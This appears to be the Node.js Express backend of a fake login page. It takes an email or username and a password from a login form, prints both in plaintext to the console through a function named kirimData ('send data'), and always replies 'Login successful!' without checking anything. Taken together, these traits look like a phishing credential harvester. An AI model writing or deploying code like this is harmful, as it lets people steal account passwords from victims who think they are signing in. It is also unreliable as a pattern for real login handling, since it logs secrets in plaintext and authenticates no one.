// app.js

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));

// Serves static files from the root directory
app.use(express.static(path.join(__dirname)));

// Serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login form submission
app.post('/login', (req, res) => {
  const emailOrUsername = req.body.email_or_username;
  const password = req.body.password;

  // Simulate sending user data (e.g., save to database)
  kirimData(emailOrUsername, password);

  res.redirect('/success');
});

// Show success message
app.get('/success', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Successful</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f0f2f5;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }
            .alert {
                position: absolute;
                top: 10%;
                left: 50%;
                transform: translateX(-50%);
                background-color: #f44336;
                color: white;
                padding: 15px;
                border-radius: 5px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
                max-width: 90%;
                text-align: center;
                z-index: 1000;
            }
            @keyframes fadeOut {
                0% { opacity: 1; }
                100% { opacity: 0; }
            }
            .fade-out {
                animation: fadeOut 8s forwards;
            }
        </style>
    </head>
    <body>
        <div class="alert fade-out">Login successful!</div>
    </body>
    </html>
  `);
});

// Function to handle user data
function kirimData(emailOrUsername, password) {
  console.log(`Data User: Email or Username - ${emailOrUsername}, Password - ${password}`);
}

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
